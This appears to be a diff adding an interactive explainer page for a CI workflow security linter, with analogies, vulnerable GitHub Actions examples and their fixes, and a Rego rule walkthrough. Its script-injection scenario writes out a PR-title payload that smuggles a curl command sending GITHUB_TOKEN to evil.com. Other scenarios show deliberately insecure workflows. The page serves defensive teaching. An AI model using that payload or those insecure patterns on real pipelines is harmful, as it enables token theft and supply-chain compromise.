+        </div>
+      </div>
+
+      <!-- Bouncer -->
+      <div class="analogy-detail open" id="ad-bouncer">
+        <div class="analogy-split">
+          <div class="analogy-half analogy-world">
+            <div class="analogy-half-label">At a club</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>A bouncer stands at the door with a rulebook</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Fake ID? You&rsquo;re not getting in</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Under age? Rejected, no matter who you are</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>The bouncer doesn&rsquo;t debate the rule — they enforce it</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>No bouncer = anyone walks in</div>
+          </div>
+          <div class="analogy-half analogy-plumb">
+            <div class="analogy-half-label">In your pipeline</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Plumber scans every change before it ships</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Action not pinned to a specific version? Rejected</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Token written to disk? Flagged, every time</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span><code>--min-score B</code> is the bouncer that blocks the deployment</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>No plumber = any workflow ships, no questions asked</div>
+          </div>
+        </div>
+        <div class="ann info-ann" style="margin-top:.85rem;">
+          <span class="ann-icon">🔑</span>
+          <div class="ann-body"><strong>The key idea:</strong> The bouncer doesn&rsquo;t wait until someone causes trouble inside. They check at the door. Plumber checks before the code ships &mdash; not after a breach is reported.</div>
+        </div>
+      </div>
+
+      <!-- Playbook -->
+      <div class="analogy-detail" id="ad-playbook">
+        <div class="analogy-split">
+          <div class="analogy-half analogy-world">
+            <div class="analogy-half-label">On a sports team</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>A playbook is a written set of plays everyone knows</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>New player joins &mdash; they learn the playbook</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>No one improvises in critical moments</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>The coach doesn&rsquo;t re-explain the rules every game</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Consistency wins championships</div>
+          </div>
+          <div class="analogy-half analogy-plumb">
+            <div class="analogy-half-label">In your pipeline</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span><code>.plumber.yaml</code> is your team&rsquo;s security playbook</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>New developer joins &mdash; the rules already apply to their PRs</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>No one has to remember to check &mdash; plumber does it automatically</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Security lead doesn&rsquo;t have to review every workflow change</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>One policy file &rarr; consistent security across every repo</div>
+          </div>
+        </div>
+        <div class="ann info-ann" style="margin-top:.85rem;">
+          <span class="ann-icon">📋</span>
+          <div class="ann-body"><strong>The key idea:</strong> Security rules written down and enforced automatically means nobody has to trust that someone remembered to follow them. The playbook runs itself.</div>
+        </div>
+      </div>
+
+      <!-- Spell Check -->
+      <div class="analogy-detail" id="ad-spellcheck">
+        <div class="analogy-split">
+          <div class="analogy-half analogy-world">
+            <div class="analogy-half-label">In a word processor</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Spell check reads every word as you type</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Red squiggly appears under the mistake immediately</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>You fix it before sending the email</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>It doesn&rsquo;t wait for your boss to point it out</div>
+            <div class="analogy-row"><span class="analogy-dot"></span>Same rules apply to everyone</div>
+          </div>
+          <div class="analogy-half analogy-plumb">
+            <div class="analogy-half-label">In your pipeline</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Plumber reads every workflow file on every commit</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Flagged issue appears in CI immediately, not after a breach</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>You fix it before the vulnerable workflow ships to production</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>Doesn&rsquo;t wait for a security audit six months later</div>
+            <div class="analogy-row"><span class="analogy-dot analogy-dot-g"></span>The same check runs for every developer, every PR</div>
+          </div>
+        </div>
+        <div class="ann info-ann" style="margin-top:.85rem;">
+          <span class="ann-icon">✍️</span>
+          <div class="ann-body"><strong>The key idea:</strong> You already use spell check without thinking about it. Pipeline security should work the same way &mdash; automatic, immediate, not a separate process you have to schedule.</div>
+        </div>
+      </div>
+
+      <h3>Now in code terms</h3>
+      <p>If you&rsquo;ve used ESLint for JavaScript, you&rsquo;ve already used the same mental model. Plumber is a linter for your workflow files &mdash; same concept, different file type.</p>
+      <div class="code-compare">
+        <div>
+          <div class="code-block">
+            <div class="code-block-header"><span class="cb-title">ESLint — checks .js files</span></div>
+            <pre><span class="hl-dim">function checkUser(user) {</span>
+<span class="hl-bad">  if (user.age == "18") {  // ← eqeqeq rule</span>
+<span class="hl-dim">    return true;</span>
+<span class="hl-dim">  }</span>
+<span class="hl-dim">}</span>
+
+<span class="hl-cmt">// Rule: use === not ==</span>
+<span class="hl-cmt">// Input: your JS code</span>
+<span class="hl-cmt">// Output: list of violations</span></pre>
+          </div>
+        </div>
+        <div>
+          <div class="code-block">
+            <div class="code-block-header"><span class="cb-title">Plumber — checks .yml workflow files</span></div>
+            <pre><span class="hl-dim">steps:</span>
+<span class="hl-bad">  - uses: actions/checkout@v4  # ← unpinned tag</span>
+<span class="hl-dim">    with:</span>
+<span class="hl-dim">      token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span>
+<span class="hl-dim">      # persist-credentials missing = token on disk</span>
+
+<span class="hl-cmt"># Rule: pin to SHA, not a tag</span>
+<span class="hl-cmt">// Input: your workflow YAML</span>
+<span class="hl-cmt">// Output: score + findings</span></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ 3. LIVE PLAYGROUND ════════════════════════ -->
+    <section class="guide-section" id="playground">
+      <h2>Live Playground</h2>
+      <div class="section-sub">Pick a vulnerability type. See it caught. See the fix. Watch the score change.</div>
+
+      <div class="scenario-bar">
+        <button class="sc-btn active" onclick="loadScenario('s1',this)">&#128274; Unpinned Action</button>
+        <button class="sc-btn" onclick="loadScenario('s2',this)">&#128190; Credential Leak</button>
+        <button class="sc-btn" onclick="loadScenario('s3',this)">&#9889; Dangerous Trigger</button>
+        <button class="sc-btn" onclick="loadScenario('s4',this)">&#128027; Script Injection</button>
+      </div>
+
+      <div class="playground-grid">
+        <div>
+          <div class="code-block">
+            <div class="code-block-header"><span class="cb-title" id="pg-filename">ci.yml</span> <span id="pg-issue" class="code-badge badge-bad"></span></div>
+            <pre id="pg-yaml"></pre>
+          </div>
+          <div class="ann" id="pg-risk" style="margin-top:.75rem;"></div>
+        </div>
+        <div>
+          <div class="scan-panel">
+            <div class="terminal-topbar">
+              <span class="terminal-dot td-red"></span><span class="terminal-dot td-yellow"></span><span class="terminal-dot td-green"></span>
+              <span class="terminal-title">plumber scan .</span>
+            </div>
+            <div class="scan-output" id="pg-output"></div>
+          </div>
+          <div class="score-row">
+            <div class="score-badge score-e">E</div>
+            <div style="font-size:.83rem;color:var(--rw-text-muted);">before fix</div>
+            <button class="fix-btn" onclick="showFix()">Show Fix &rarr;</button>
+          </div>
+          <div class="fix-reveal" id="pg-fix-wrap">
+            <div class="code-block">
+              <div class="code-block-header"><span class="cb-title">ci.yml</span> <span class="code-badge badge-ok">fixed</span></div>
+              <pre id="pg-fix"></pre>
+            </div>
+            <div class="score-row" style="margin-top:.75rem;">
+              <div class="score-badge score-a">A</div>
+              <div style="font-size:.83rem;color:#4ade80;font-weight:600;">100/100 &mdash; pipeline clean</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ 4. HOW RULES WORK ═════════════════════════ -->
+    <section class="guide-section" id="rego">
+      <h2>How Rules Work</h2>
+      <div class="section-sub">Step through the credential-leak check, one line at a time.</div>
+
+      <p>Under the hood, plumber uses <strong>OPA (Open Policy Agent)</strong> &mdash; the same policy engine that powers Kubernetes security. Rules are written in <strong>Rego</strong>, a declarative language. Think of it as the spell-check dictionary: each rule is one question the engine asks about your pipeline.</p>
+      <p>Here is the credential-leak rule being evaluated against a real workflow, step by step.</p>
+
+      <div class="rego-step-nav">
+        <button class="step-btn" id="rego-prev" onclick="regoStep(-1)" disabled>&larr; Prev</button>
+        <span class="step-indicator" id="rego-indicator">Step 1 of 5</span>
+        <button class="step-btn" id="rego-next" onclick="regoStep(1)">Next &rarr;</button>
+      </div>
+
+      <div class="rego-grid">
+        <div>
+          <div style="font-family:var(--rw-font-display);font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--rw-text-subtle);margin-bottom:.5rem;">The Rule (Rego)</div>
+          <div class="code-block">
+            <div class="code-block-header"><span class="cb-title">credential-leak.rego</span> <span class="code-badge badge-ind">OPA policy</span></div>
+            <pre id="rego-rule"></pre>
+          </div>
+        </div>
+        <div>
+          <div style="font-family:var(--rw-font-display);font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--rw-text-subtle);margin-bottom:.5rem;">Your Pipeline (parsed data)</div>
+          <div class="code-block">
+            <div class="code-block-header"><span class="cb-title">input.pipeline</span> <span class="code-badge badge-ind">parsed YAML</span></div>
+            <pre id="rego-input"></pre>
+          </div>
+        </div>
+      </div>
+      <div class="rego-explain" id="rego-explain"></div>
+    </section>
+
+    <!-- ══ 5. ARCHITECTURE ═══════════════════════════ -->
+    <section class="guide-section" id="architecture">
+      <h2>Architecture</h2>
+      <div class="section-sub">Click any box to see what it does.</div>
+
+      <p>Plumber is a Go command-line tool. Your YAML goes in one end, a score and findings come out the other. The middle layer &mdash; the NormalizedPipeline &mdash; is the design insight that makes it work on both GitHub Actions and GitLab CI with the same rules.</p>
+
+      <div class="arch-flow">
+        <div class="arch-box" onclick="showArch('yaml')"><div class="arch-box-icon">📄</div><div class="arch-box-label">YAML Files</div><div class="arch-box-sub">.github/workflows/</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('parser')"><div class="arch-box-icon">🔍</div><div class="arch-box-label">Go Parser</div><div class="arch-box-sub">github/ gitlab/</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('ir')"><div class="arch-box-icon">🧱</div><div class="arch-box-label">Pipeline IR</div><div class="arch-box-sub">common data shape</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('opa')"><div class="arch-box-icon">⚖️</div><div class="arch-box-label">OPA Engine</div><div class="arch-box-sub">policy evaluator</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('rules')"><div class="arch-box-icon">📋</div><div class="arch-box-label">Rules</div><div class="arch-box-sub">9 categories</div></div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-box" onclick="showArch('output')"><div class="arch-box-icon">📊</div><div class="arch-box-label">Score + Findings</div><div class="arch-box-sub">A–E · SARIF · JSON</div></div>
+      </div>
+
+      <div class="arch-detail" id="arch-detail">
+        <div class="arch-detail-icon" id="arch-d-icon"></div>
+        <div><h4 id="arch-d-title"></h4><p id="arch-d-body"></p><p id="arch-d-files" style="margin:0;font-size:.8rem;color:var(--rw-text-subtle);"></p></div>
+      </div>
+
+      <div class="feature-grid" style="margin-top:2rem;">
+        <div class="feature-card">
+          <div class="feature-card-icon">🔄</div>
+          <h4>One Rule, Two Platforms</h4>
+          <p>Both GitHub Actions and GitLab CI parse into the same data shape. A rule written once works on both &mdash; no duplication, no platform-specific versions.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-card-icon">📖</div>
+          <h4>Open Rules</h4>
+          <p>Every rule is a readable file in the open-source repo. You can see exactly what is being checked and why. No black box.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-card-icon">⚡</div>
+          <h4>Attack-Path Scoring</h4>
+          <p>Not every problem is equal. A misconfiguration in a deploy pipeline that publishes to npm is ranked higher than the same issue in a docs build. Scoring reflects actual risk.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ 6. VS OTHERS ══════════════════════════════ -->
+    <section class="guide-section" id="compare">
+      <h2>vs. Other Tools</h2>
+      <div class="section-sub">Filter by what matters to you. ✓ yes &nbsp; ◐ partial &nbsp; ✗ no</div>
+
+      <div class="filter-bar">
+        <button class="filter-chip active" onclick="filterVendors('all',this)">All</button>
+        <button class="filter-chip" onclick="filterVendors('gitlab',this)">GitLab CI</button>
+        <button class="filter-chip" onclick="filterVendors('free',this)">Free / No Account</button>
+        <button class="filter-chip" onclick="filterVendors('scoring',this)">Attack-Path Score</button>
+        <button class="filter-chip" onclick="filterVendors('runtime',this)">Runtime Monitoring</button>
+        <button class="filter-chip" onclick="filterVendors('gate',this)">Block CI (Policy Gate)</button>
+      </div>
+
+      <div class="vendor-grid" id="vendor-grid"></div>
+    </section>
+
+  </main>
+</div>
+
+<div id="rw-footer"
+     data-linkedin="shassanchi"
+     data-related='[{"label":"TrustLens — AI Vendor Trust Scorer","url":"/usecase/trustlens.html"},{"label":"SentTriage — Email Triage Agent","url":"/usecase/sent-triage.html"},{"label":"BuildBridge AI","url":"/usecase/buildbridge-ai.html"}]'
+></div>
+<script src="../includes/rw-footer.js?v=20260612"></script>
+
+<script>
+// ── Hero terminal ─────────────────────────────────────────────────────────────
+(function(){
+  var lines=[
+    {t:'$ plumber scan .',c:'cmd'},{t:'',c:''},
+    {t:'  → parsing .github/workflows/ci.yml ...',c:'info'},
+    {t:'  → evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
+    {t:'  Credential Leak   [LOW]   token written to .git/config',c:'warn'},
+    {t:'                    ci.yml line 8',c:'dim'},{t:'',c:''},
+    {t:'  Unpinned Action   [MED]   action pinned to mutable tag',c:'bad'},
+    {t:'                    ci.yml line 8',c:'dim'},{t:'',c:''},
+    {t:'  Missing Perms     [MED]   no permissions block declared',c:'bad'},
+    {t:'                    ci.yml line 1',c:'dim'},{t:'',c:''},
+    {t:'  Score: E  30/100  ─────────── 3 findings',c:'bad'},{t:'',c:''},
+    {t:'$ # add persist-credentials: false, pin SHA,',c:'dim'},
+    {t:'$ # add permissions: contents: read',c:'dim'},
+    {t:'$ plumber scan .',c:'cmd'},{t:'',c:''},
+    {t:'  → parsing .github/workflows/ci.yml ...',c:'info'},
+    {t:'  → evaluating 9 risk categories ...',c:'info'},{t:'',c:''},
+    {t:'  ✓ 22 controls passing',c:'ok'},
+    {t:'  ✓ No findings',c:'ok'},{t:'',c:''},
+    {t:'  Score: A  100/100  ██████████  clean',c:'gem'},
+  ];
+  var el=document.getElementById('hero-terminal'); if(!el)return;
+  var i=0;
+  function next(){
+    if(i>=lines.length){setTimeout(function(){el.innerHTML='';i=0;next();},3500);return;}
+    var l=lines[i++],row=document.createElement('div');
+    row.className='tl'+(l.c?' '+l.c:''); row.textContent=l.t;
+    el.appendChild(row); el.scrollTop=el.scrollHeight;
+    setTimeout(next, l.t===''?150:(l.c==='cmd'?500:(l.c==='info'||l.c==='dim'?280:220)));
+  }
+  next();
+})();
+
+// ── Workflow starter toggle ───────────────────────────────────────────────────
+function toggleWorkflow(){
+  var btn=document.getElementById('wf-toggle');
+  var box=document.getElementById('wf-starter');
+  var open=box.classList.toggle('open');
+  btn.classList.toggle('open',open);
+}
+
+// ── Analogy cards ─────────────────────────────────────────────────────────────
+function showAnalogy(id,card){
+  document.querySelectorAll('.analogy-card').forEach(function(c){c.classList.remove('active');});
+  document.querySelectorAll('.analogy-detail').forEach(function(d){d.classList.remove('open');});
+  card.classList.add('active');
+  document.getElementById('ad-'+id).classList.add('open');
+}
+
+// ── Playground ────────────────────────────────────────────────────────────────
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function renderLines(lines){
+  return lines.map(function(l){
+    return l.c?'<span class="'+l.c+'">'+esc(l.t)+'</span>':esc(l.t);
+  }).join('\n');
+}
+
+var scenarios={
+  s1:{
+    title:'ci.yml', badge:'Unpinned Action', badgeCls:'badge-bad',
+    yaml:[
+      {t:'on: [push, pull_request]',c:''},
+      {t:'jobs:',c:''},{t:'  build:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@v4  # ← mutable tag',c:'hl-bad'},
+      {t:'      - run: npm ci && npm test',c:''},
+    ],
+    risk:{icon:'⚠️',msg:'<strong>The risk:</strong> <code>@v4</code> is a tag the action owner can move to any commit at any time. If someone compromises the <code>actions/checkout</code> repository and moves the <code>v4</code> tag to a malicious commit, every pipeline using <code>@v4</code> automatically runs the malicious code &mdash; with full access to your secrets.'},
+    output:[
+      {t:'  Unpinned Action  [MEDIUM]',c:'bad'},
+      {t:'  actions/checkout pinned to mutable tag @v4',c:'bad'},
+      {t:'  ci.yml line 6',c:'dim'},{t:'',c:''},
+      {t:'  The tag can be moved to any commit.',c:'dim'},
+      {t:'  Fix: pin to a full SHA hash instead.',c:'dim'},{t:'',c:''},
+      {t:'  Score: E  55/100',c:'warn'},
+    ],
+    fix:[
+      {t:'on: [push, pull_request]',c:''},{t:'jobs:',c:''},{t:'  build:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4',c:'hl-ok'},
+      {t:'      - run: npm ci && npm test',c:''},
+    ],
+  },
+  s2:{
+    title:'ci.yml', badge:'Credential Leak', badgeCls:'badge-warn',
+    yaml:[
+      {t:'jobs:',c:''},{t:'  build:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@v4',c:''},
+      {t:'        with:',c:''},
+      {t:'          token: ${{ secrets.GITHUB_TOKEN }}',c:''},
+      {t:'          # persist-credentials defaults to true  ←',c:'hl-bad'},
+      {t:'      - run: npm ci && npm build',c:''},
+      {t:'      - uses: actions/upload-artifact@v4',c:''},
+      {t:'        with:',c:''},
+      {t:'          path: ./dist       # may include .git/ folder',c:'hl-bad'},
+    ],
+    risk:{icon:'🔐',msg:'<strong>The risk:</strong> By default, <code>actions/checkout</code> writes your <code>GITHUB_TOKEN</code> into <code>.git/config</code>. When <code>upload-artifact</code> packages the <code>dist</code> folder, it can include <code>.git/config</code> &mdash; and your live token &mdash; in the artifact. Anyone who can download the artifact can authenticate to your GitHub repo.'},
+    output:[
+      {t:'  Credential Leak (High)',c:'bad'},
+      {t:'  Token persists AND .git packed into artifact',c:'bad'},{t:'',c:''},
+      {t:'  Credential Leak (Low)',c:'warn'},
+      {t:'  persist-credentials: false missing',c:'warn'},
+      {t:'  Token written to .git/config',c:'dim'},{t:'',c:''},
+      {t:'  Score: E  20/100',c:'bad'},
+    ],
+    fix:[
+      {t:'jobs:',c:''},{t:'  build:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@11bd71901b  # SHA',c:'hl-ok'},
+      {t:'        with:',c:''},
+      {t:'          token: ${{ secrets.GITHUB_TOKEN }}',c:''},
+      {t:'          persist-credentials: false  # ✓ token not saved',c:'hl-ok'},
+      {t:'      - run: npm ci && npm build',c:''},
+      {t:'      - uses: actions/upload-artifact@v4',c:''},
+      {t:'        with:',c:''},
+      {t:'          path: ./dist/assets  # ✓ specific subfolder, no .git/',c:'hl-ok'},
+    ],
+  },
+  s3:{
+    title:'deploy.yml', badge:'Dangerous Trigger', badgeCls:'badge-bad',
+    yaml:[
+      {t:'on:',c:''},
+      {t:'  pull_request_target:  # ← fires with base-repo secrets',c:'hl-bad'},
+      {t:'    types: [opened, synchronize]',c:''},
+      {t:'jobs:',c:''},{t:'  deploy:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@v4',c:''},
+      {t:'        with:',c:''},
+      {t:'          ref: ${{ github.event.pull_request.head.sha }}',c:'hl-bad'},
+      {t:'      - run: npm run deploy',c:''},
+    ],
+    risk:{icon:'⚡',msg:'<strong>The risk:</strong> <code>pull_request_target</code> runs in the context of the <em>base</em> repo with access to its secrets &mdash; even for PRs from external forks. By checking out the fork\'s code, you run attacker-controlled code with your own secrets. This is the exact pattern behind the March 2025 tj-actions supply-chain attack (CVE-2025-30066).'},
+    output:[
+      {t:'  Dangerous Trigger  [CRITICAL]',c:'bad'},
+      {t:'  pull_request_target + fork head checkout',c:'bad'},
+      {t:'  = fork code running with base-repo secrets',c:'bad'},{t:'',c:''},
+      {t:'  Pattern behind CVE-2025-30066.',c:'dim'},
+      {t:'  Attacker submits PR with malicious code',c:'dim'},
+      {t:'  that exfiltrates your secrets.',c:'dim'},{t:'',c:''},
+      {t:'  Score: E  10/100',c:'bad'},
+    ],
+    fix:[
+      {t:'on:',c:''},
+      {t:'  pull_request:           # ✓ safe — no base-repo secrets',c:'hl-ok'},
+      {t:'    types: [opened, synchronize]',c:''},
+      {t:'jobs:',c:''},{t:'  test:',c:''},
+      {t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - uses: actions/checkout@11bd71901b  # SHA',c:'hl-ok'},
+      {t:'        with:',c:''},
+      {t:'          persist-credentials: false',c:'hl-ok'},
+      {t:'      - run: npm test   # test only, never deploy from PRs',c:'hl-ok'},
+    ],
+  },
+  s4:{
+    title:'pr-check.yml', badge:'Script Injection', badgeCls:'badge-bad',
+    yaml:[
+      {t:'on: pull_request_target   # ← privileged trigger',c:'hl-bad'},
+      {t:'jobs:',c:''},{t:'  notify:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - run: |',c:''},
+      {t:'          echo "PR: ${{ github.event.pull_request.title }}"',c:'hl-bad'},
+      {t:"          # attacker's PR title: \"; curl evil.com?t=$TOKEN\"",c:'hl-bad'},
+    ],
+    risk:{icon:'💉',msg:'<strong>The risk:</strong> The PR title is set by the person opening the PR &mdash; anyone, including an attacker. When it is pasted directly into a shell command with <code>${{ }}</code>, the shell executes it as code. An attacker opens a PR titled <code>"; curl https://evil.com/steal?t=$GITHUB_TOKEN #</code> and your pipeline sends your token to them.'},
+    output:[
+      {t:'  Script Injection  [CRITICAL]',c:'bad'},
+      {t:'  PR title injected directly into shell run: step',c:'bad'},{t:'',c:''},
+      {t:'  github.event.pull_request.title is',c:'dim'},
+      {t:'  set by the PR author. Direct ${{ }} in',c:'dim'},
+      {t:'  a run: block = arbitrary code execution.',c:'dim'},{t:'',c:''},
+      {t:'  Fix: pass via env: variable instead.',c:'ok'},{t:'',c:''},
+      {t:'  Score: E  5/100',c:'bad'},
+    ],
+    fix:[
+      {t:'on: pull_request   # ✓ use safe trigger',c:'hl-ok'},
+      {t:'jobs:',c:''},{t:'  notify:',c:''},{t:'    runs-on: ubuntu-latest',c:''},
+      {t:'    steps:',c:''},
+      {t:'      - run: |',c:''},
+      {t:'          echo "PR: $TITLE"    # ✓ env var, shell-quoted',c:'hl-ok'},
+      {t:'        env:',c:'hl-ok'},
+      {t:'          TITLE: ${{ github.event.pull_request.title }}',c:'hl-ok'},
+    ],
+  },
+};
+
+function loadScenario(id,btn){
+  document.querySelectorAll('.sc-btn').forEach(function(b){b.classList.remove('active');});
+  btn.classList.add('active');
+  var sc=scenarios[id];
+  document.getElementById('pg-filename').textContent=sc.title;
+  var iss=document.getElementById('pg-issue');
+  iss.textContent=sc.badge; iss.className='code-badge '+sc.badgeCls;
+  document.getElementById('pg-yaml').innerHTML=renderLines(sc.yaml);
+  var risk=document.getElementById('pg-risk');
+  risk.innerHTML='<span class="ann-icon">'+sc.risk.icon+'</span><div class="ann-body">'+sc.risk.msg+'</div>';
+  var out=document.getElementById('pg-output'); out.innerHTML='';
+  sc.output.forEach(function(l){var d=document.createElement('div');d.className='tl'+(l.c?' '+l.c:'');d.textContent=l.t;out.appendChild(d);});
+  document.getElementById('pg-fix').innerHTML=renderLines(sc.fix);
+  document.getElementById('pg-fix-wrap').classList.remove('open');
+}
+function showFix(){document.getElementById('pg-fix-wrap').classList.add('open');}
+loadScenario('s1',document.querySelector('.sc-btn'));
+
+// ── Rego visualizer ───────────────────────────────────────────────────────────
+var regoSteps=[
+  {
+    rule:[
+      {t:'package credential_leak',c:''},{t:'',c:''},{t:'import rego.v1',c:''},{t:'',c:''},
+      {t:'deny contains finding if {',c:''},
+      {t:'  some i',c:''},{t:'  job := input.pipeline.jobs[i]',c:''},
+      {t:'  some j',c:''},{t:'  step := job.steps[j]',c:''},
+      {t:'  contains(step.uses, "actions/checkout")',c:''},
+      {t:'  step.with.persistCredentials == true',c:''},
+      {t:'  finding := { "message": "credential leak", ... }',c:''},
+      {t:'}',c:''},
+    ],
+    input:[
+      {t:'{',c:''},{t:'  "pipeline": {',c:''},{t:'    "jobs": [',c:''},
+      {t:'      { "name": "build",',c:''},{t:'        "steps": [...] }',c:''},
+      {t:'    ]',c:''},{t:'  }',c:''},{t:'}',c:''},
+    ],
+    explain:'<strong>Step 1 of 5 — Your YAML is parsed into structured data.</strong><br><br>Plumber reads <code>ci.yml</code> and converts it into a Go data object called <code>NormalizedPipeline</code>. This is serialised to JSON and becomes <code>input.pipeline</code> &mdash; the data every rule reads. Think of it as plumber transcribing the YAML into a format the rules engine can interrogate.'
+  },
+  {
+    rule:[
+      {t:'package credential_leak',c:''},{t:'',c:''},{t:'import rego.v1',c:''},{t:'',c:''},
+      {t:'deny contains finding if {',c:''},
+      {t:'  some i',c:'rego-active-line'},{t:'  job := input.pipeline.jobs[i]',c:'rego-active-line'},
+      {t:'  some j',c:''},{t:'  step := job.steps[j]',c:''},
+      {t:'  contains(step.uses, "actions/checkout")',c:''},
+      {t:'  step.with.persistCredentials == true',c:''},
+      {t:'  finding := { "message": "credential leak", ... }',c:''},
+      {t:'}',c:''},
+    ],
+    input:[
+      {t:'{',c:''},{t:'  "pipeline": {',c:''},{t:'    "jobs": [',c:''},
+      {t:'      {',c:'rego-active-line'},{t:'        "name": "build",',c:'rego-active-line'},
+      {t:'        "steps": [...]',c:'rego-active-line'},{t:'      }',c:'rego-active-line'},
+      {t:'    ]',c:''},{t:'  }',c:''},{t:'}',c:''},
+    ],
+    explain:'<strong>Step 2 of 5 — The rule tries every job.</strong><br><br>OPA works like this: <code>some i</code> means &ldquo;try all possible values of i.&rdquo; For each value, <code>job := input.pipeline.jobs[i]</code> binds that job to a variable. OPA tries every job in your pipeline until it finds one where all the conditions are true &mdash; or finds none and emits no finding.'
+  },
+  {
+    rule:[
+      {t:'package credential_leak',c:''},{t:'',c:''},{t:'import rego.v1',c:''},{t:'',c:''},
+      {t:'deny contains finding if {',c:''},
+      {t:'  some i',c:''},{t:'  job := input.pipeline.jobs[i]',c:''},
+      {t:'  some j',c:'rego-active-line'},{t:'  step := job.steps[j]',c:'rego-active-line'},
+      {t:'  contains(step.uses, "actions/checkout")',c:'rego-active-line'},
+      {t:'  step.with.persistCredentials == true',c:''},
+      {t:'  finding := { "message": "credential leak", ... }',c:''},
+      {t:'}',c:''},
+    ],
+    input:[
+      {t:'"steps": [',c:''},
+      {t:'  {',c:'rego-active-line'},
+      {t:'    "uses": "actions/checkout@v4",',c:'rego-active-line'},
+      {t:'    "with": {',c:'rego-active-line'},
+      {t:'      "persistCredentials": true,',c:'rego-active-line'},
+      {t:'      "token": "***"',c:''},
+      {t:'    }',c:''},{t:'  }',c:''},{t:']',c:''},
+    ],
+    explain:'<strong>Step 3 of 5 — Found the checkout step.</strong><br><br>Now iterating over the steps in the job. <code>contains(step.uses, "actions/checkout")</code> checks whether the step uses the checkout action. It found one. The rule now moves to the next condition with this step bound. The bouncer has found someone who matches the first rule check &mdash; now checking the second.'
+  },
+  {
+    rule:[
+      {t:'package credential_leak',c:''},{t:'',c:''},{t:'import rego.v1',c:''},{t:'',c:''},
+      {t:'deny contains finding if {',c:''},
+      {t:'  some i',c:''},{t:'  job := input.pipeline.jobs[i]',c:''},
+      {t:'  some j',c:''},{t:'  step := job.steps[j]',c:''},
+      {t:'  contains(step.uses, "actions/checkout")',c:''},
+      {t:'  step.with.persistCredentials == true',c:'rego-active-line'},
+      {t:'  finding := { "message": "credential leak", ... }',c:''},
+      {t:'}',c:''},
+    ],
+    input:[
+      {t:'"with": {',c:''},
+      {t:'  "persistCredentials": true,',c:'rego-active-line'},
+      {t:'  // This was NOT set in your YAML.',c:'rego-active-line'},
+      {t:'  // The parser set it to true because',c:'rego-active-line'},
+      {t:'  // that is the checkout action\'s default.',c:'rego-active-line'},
+      {t:'}',c:''},
+    ],
+    explain:'<strong>Step 4 of 5 — persistCredentials is true.</strong><br><br>The Go parser sets <code>persistCredentials</code> to <code>true</code> when it is absent from your YAML &mdash; because that is what the checkout action defaults to. The condition <code>step.with.persistCredentials == true</code> is met. The rule has now found a job where all conditions are satisfied.'
+  },
+  {
+    rule:[
+      {t:'package credential_leak',c:''},{t:'',c:''},{t:'import rego.v1',c:''},{t:'',c:''},
+      {t:'deny contains finding if {',c:''},
+      {t:'  some i',c:''},{t:'  job := input.pipeline.jobs[i]',c:''},
+      {t:'  some j',c:''},{t:'  step := job.steps[j]',c:''},
+      {t:'  contains(step.uses, "actions/checkout")',c:''},
+      {t:'  step.with.persistCredentials == true',c:''},
+      {t:'  finding := { "message": "credential leak", ... }',c:'rego-active-line'},
